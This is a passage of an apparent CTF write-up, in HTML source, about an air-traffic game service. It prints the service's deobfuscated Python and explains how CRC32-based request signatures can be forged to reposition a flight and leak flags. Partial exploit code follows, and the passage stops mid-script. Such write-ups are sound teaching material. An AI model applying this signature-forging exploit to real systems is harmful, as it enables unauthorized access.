+&lt;p&gt;The handle function is slightly obfuscated as the &lt;tt class="docutils literal"&gt;handle.py&lt;/tt&gt; module contains an &lt;tt class="docutils literal"&gt;exec&lt;/tt&gt; on a string containing the code. However if one just prints that string it's perfectly readable. Careful, wall of python code incoming! I only include the parts needed for the actual vuln and thus our exploit.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;C0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;R&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+        &lt;span class="c"&gt;# if the request had an ID field and also RAND/SIGN&lt;/span&gt;
+        &lt;span class="c"&gt;#  then the response will also be signed&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__v10&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;RAND&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;utils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GenRandomValues&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SIGN&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;utils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ComputeSign&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__v3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c"&gt;# v1 is the response dict, __v3 is the key&lt;/span&gt;
+        &lt;span class="n"&gt;v3&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()):&lt;/span&gt;
+            &lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;=&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CODE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="c"&gt;# v9 gets set in D() Method (see below)&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__v9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;has_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__v9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__v9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;G&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;L&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;=&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;70&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;Q&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+        &lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;v3&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;D&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v9&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__v9&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;v9&lt;/span&gt;
+
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+&lt;span class="n"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+        &lt;span class="c"&gt;# set v10 (flag id) and hand data off to the RequestHandler.HandleData(AirplaneDatabase, szData, Answer)&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;v5&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;G&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;FGID=([^&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;]+)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;v10&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HandleData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;v5&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ERROR&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
+
+        &lt;span class="c"&gt;# HandleData needs to be successful&lt;/span&gt;
+        &lt;span class="c"&gt;# this is where the flag lookup&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;v9&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetAirplanes&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;math&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;atan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;float&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Dy&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Py&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nb"&gt;float&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Dx&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Px&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;angle&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                    &lt;span class="n"&gt;v5&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+                    &lt;span class="k"&gt;break&lt;/span&gt;
+
+        &lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v5&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We need one more code location for the explanation:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;ComputeSign&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;szKey&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()):&lt;/span&gt;
+        &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;:&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;szKey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%.8x&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;binascii&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crc32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xffffffff&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="the-vulnerability"&gt;
+&lt;h2&gt;The vulnerability&lt;/h2&gt;
+&lt;p&gt;The only way to access flag data is contained in the &lt;tt class="docutils literal"&gt;R&lt;/tt&gt; function. It takes values from the &lt;tt class="docutils literal"&gt;z&lt;/tt&gt; dict when &lt;tt class="docutils literal"&gt;self.__v9&lt;/tt&gt; is a valid dictionary key (thus flag-id). We can only set that attribute through calling the &lt;tt class="docutils literal"&gt;D&lt;/tt&gt; method - and that again only is possible by directing the program flow of the handle function into the last forloop's inner if-statement.&lt;/p&gt;
+&lt;p&gt;Now what does that if statement mean? Basically, going through all airplanes, it checks if the &amp;quot;angle&amp;quot; of the current flight direction deviates more than &lt;tt class="docutils literal"&gt;0.1&lt;/tt&gt; from the original angle between origin and destination of the corresponding flight.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="ok-let-s-re-route-a-flight"&gt;
+&lt;h2&gt;OK, let's re-route a flight&lt;/h2&gt;
+&lt;p&gt;So to get our precious flag we need to update a flight's current position to somwhere where it's angle to the destination is way off what it should be. To be able to do that we need to send a &amp;quot;SETPOS&amp;quot; request as seen in the above conversation of the gameserver with our service. the SETPOS request needs to be signed though. And that leads us to the vulnerability in the service. The signatures depend on the request contents and a secret MASTER_KEY that we do not have. However for the signature values it uses CRC32 - which is not a cryptographic hash function and thus allows us to craft a request that will has the same signature as another message.&lt;/p&gt;
+&lt;p&gt;We will thus steal one of the service's response message signatures, craft our own SETPOS request that will end up having the same CRC32 signature, so that the service accepts it and returns the flag.&lt;/p&gt;
+&lt;p&gt;So far so good - how exactly do we do that? We pay our good friend &lt;a class="reference external" href="https://twitter.com/stalkr_"&gt;StalkR&lt;/a&gt; a visit, who has appropriate &lt;a class="reference external" href="http://blog.stalkr.net/2011/03/crc-32-forging.html"&gt;CRC32 forging code&lt;/a&gt; ready - and it's in Python :)&lt;/p&gt;
+&lt;p&gt;Before being able to use the code we need to request the list of flights.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;MEGAREGEX&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;FLIGHT &amp;quot;([A_0-9]{6})&amp;quot;.*pos=\[(\d+),(\d+)\].*orig=&amp;quot;([A-Za-z ]+).*dest=&amp;quot;([A-Za-z ]+)&amp;quot;\(\[(\d+),(\d+)&amp;#39;&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;do_exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag_id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CODE=LIST&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CODE=OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;flights&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;FLIGHT&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;flight&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flights&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="n"&gt;fid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;posx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;posy&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;szOrigin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;szDestination&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MEGAREGEX&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flight&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;To be able to deviate the flight position into the correct direction, we employ some math and put it into really ugly python code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;posx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;posy&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;posx&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;posy&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ox&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;posy&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dx&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;posx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*-&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;
+&lt;span class="n"&gt;iDiff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;math&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ox&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oy&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
